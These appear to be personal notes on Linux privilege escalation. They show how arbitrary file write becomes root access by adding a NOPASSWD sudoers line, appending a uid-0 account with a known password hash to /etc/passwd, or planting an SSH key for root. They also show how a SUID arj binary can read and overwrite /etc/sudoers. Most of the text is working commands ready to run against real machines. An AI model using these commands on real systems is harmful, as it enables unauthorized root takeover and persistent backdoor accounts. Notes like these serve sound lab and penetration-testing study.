# PE Notes

# Arbitrary File Write

If you have the ability to write to files, you could do 3 things.

1. add your user (or all users) to `etc/sudoers` , effectively giving yourself ability to `sudo su -` into root user

```jsx
$cat /etc/sudoers
-- snip --
##
## User privilege specification
##
root ALL=(ALL) ALL

--snip -- 
# Defaults targetpw  # Ask for the password of the target user
# ALL ALL=(ALL) ALL  # WARNING: only use this together with 'Defaults targetpw'

## Read drop-in files from /etc/sudoers.d
@includedir /etc/sudoers.d

virusspec ALL=(ALL) ALL
yourusername ALL=(ALL) NOPASSWD:ALL # optionally, have no password requirement
```

1. You can add your privileged user to `/etc/passwd`. This will allow you to `su` to the privileged user or SSH in (although might not be able to due to SSH configuration)

```jsx
echo 'virusspec:$1$virusspe$4YouPJf89m7D8Nk48Qvjn.:0:0::/root:/bin/bash' >> /etc/passwd # virusspec:pass123
```

1. You can add your public ssh key to `/root/.ssh/authorized_keys`. This one doesn’t always work since there isn’t always a `.ssh` directory.

# SUID on /usr/bin/ajr

### read a file (/etc/sudoers)

```bash
arj a sudoers /etc/sudoers
arj p sudoers
# output will be contents of /etc/sudoers

# write to the file
arj a new ./sudoers # modified sudoers file
arj e new.arj /etc/ # this will replace /etc/sudoers
```

```bash
# create archive
arj a <file.arj-to-create> <file-to-add-to-archive>

# test archive
arj l <file.arj>

# extract archive
# will extract in current dir
arj e <file.arj>
# extract in specified dir
arj x <file.arj> <path-to-extract-to>
```